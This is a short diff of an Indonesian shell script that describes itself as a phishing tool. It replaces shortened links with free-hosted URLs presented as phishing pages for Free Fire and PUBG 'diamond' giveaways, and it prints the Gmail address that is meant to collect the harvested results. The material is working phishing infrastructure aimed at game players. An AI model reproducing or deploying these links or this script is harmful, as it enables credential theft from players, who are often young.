@@ -65,9 +65,9 @@ echo "Script ini berfungsi untuk Phising"
 sleep 2
 echo "Phising game "
 sleep 2
-echo "Phising Diamond FF: https://bit.ly/3jSJFuS"
+echo "Phising Diamond FF: https://powersay.000webhostapp.com/Incubator/#close"
 sleep 1
-echo "Phising Diamond PUBG: https://bit.ly/3jSJFuS"
+echo "Phising Diamond PUBG: https://powersay.000webhostapp.com/Incubator/#login"
 sleep 1
 echo "Gmail penerimaan hasil " $gmail
 sleep 3
